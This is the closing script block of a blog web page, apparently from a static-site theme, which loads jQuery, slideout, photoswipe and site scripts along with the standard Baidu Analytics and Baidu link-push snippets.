<script type="text/javascript" src="/lib/jquery/jquery-3.2.1.min.js"></script>
  <script type="text/javascript" src="/lib/slideout/slideout-1.0.1.min.js"></script>




<script type="text/javascript" src="/js/main.638251f4230630f0335d8c6748e53a96f94b72670920b60c09a56fdc8bece214.js" integrity="sha256-Y4JR9CMGMPAzXYxnSOU6lvlLcmcJILYMCaVv3Ivs4hQ=" crossorigin="anonymous"></script>






<script id="baidu_analytics">
  var _hmt = _hmt || [];
  (function() {
    if (window.location.hostname === 'localhost') return;
    var hm = document.createElement("script"); hm.async = true;
    hm.src = "https://hm.baidu.com/hm.js?90a2a7fb2c0fa46d3747ec9668f12a39";
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(hm, s);
  })();
</script>

<script id="baidu_push">
  (function(){
    if (window.location.hostname === 'localhost') return;
    var bp = document.createElement('script'); bp.async = true;
    var curProtocol = window.location.protocol.split(':')[0];
    if (curProtocol === 'https') {
      bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
    }
    else {
      bp.src = 'http://push.zhanzhang.baidu.com/push.js';
    }
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(bp, s);
  })();
</script>



  
    <script type="text/javascript" src="/js/load-photoswipe.js"></script>
    <script type="text/javascript" src="/lib/photoswipe/photoswipe.min.js"></script>
    <script type="text/javascript" src="/lib/photoswipe/photoswipe-ui-default.min.js"></script>
  














  <script src="/js/my.js"></script>


</body>
</html>
